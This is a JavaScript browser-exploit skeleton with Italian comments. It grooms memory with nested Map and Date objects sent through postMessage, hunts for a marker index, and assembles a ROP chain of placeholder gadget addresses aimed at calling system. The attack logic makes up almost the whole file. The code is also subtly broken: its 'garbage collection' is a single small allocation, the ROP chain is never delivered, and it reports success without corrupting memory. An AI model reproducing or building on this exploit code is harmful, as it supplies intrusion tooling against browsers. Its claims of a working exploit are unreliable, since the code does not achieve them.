// Gadget addresses (da configurare con indirizzi corretti)
const gadgets = {
    pop_rdi: 0x0000000000401234,
    pop_rsi: 0x0000000000405678,
    pop_rdx: 0x0000000000409abc,
    ret: 0x000000000040abcd,
    system: 0x0000000000401111,
    exit: 0x0000000000402222
};

// Garbage Collection
function gc() {
    try {
        new Uint8Array(256 * 1024);
        alert('GC eseguita.');
    } catch (e) {
        console.error("Errore durante la GC:", e.message);
    }
}

// Funzione per creare struttura di memoria
function createObjectStructure(numElems) {
    let root = new Map();
    let msg = root;
    let foo = [];

    for (let i = 0; i < 5; i++) {
        foo.push(new Date(0xffff));
    }

    for (let i = 0; i < numElems; i++) {
        const d = new Date(i);
        const map = new Map();
        msg.set(d, [map, foo]);
        msg = map;
    }

    gc(); // Esegui garbage collection
    alert('Struttura oggetti creata.');
    return root;
}

// Funzione per la ROP Chain
function ropChain() {
    const chain = [
        gadgets.pop_rdi, 0xdeadbeef,  // Argomento a system
        gadgets.system,               // Chiamata system
        gadgets.exit                  // Chiamata exit
    ];
    return chain;
}

// Funzione principale
async function main() {
    alert("Inizio exploit...");

    const numElems = 10;
    let root = createObjectStructure(numElems);
    let msg = root;
    let idx = null;
    let found = false;

    while (!found) {
        try {
            let data = null;
            const prom = new Promise(resolve => {
                addEventListener('message', event => {
                    data = event.data;
                    resolve();
                }, { once: true });
            });

            alert("Invio messaggio...");
            postMessage(msg, '*');  // Pubblica il messaggio
            await prom;

            alert("Messaggio ricevuto con successo.");
            gc();

            // Ricerca dell'indice
            for (let i = 0; i < numElems; i++) {
                if (data.keys().next().value.getTime() === 0xffff) {
                    idx = i;
                    found = true;
                    break;
                }
                data = data.values().next().value[0];
            }
        } catch (e) {
            console.error("Errore durante la ricerca dell'indice:", e.message);
            alert("Errore: " + e.message);
            break;
        }
    }

    if (found) {
        alert('[+] Indice trovato: ' + idx);
        let rop = ropChain();
        alert("ROP Chain creata. Exploit completato.");
    } else {
        alert("Indice non trovato. Exploit fallito.");
    }
}

// Avvio exploit
document.getElementById('runExploit').addEventListener('click', async () => {
    await main();
});
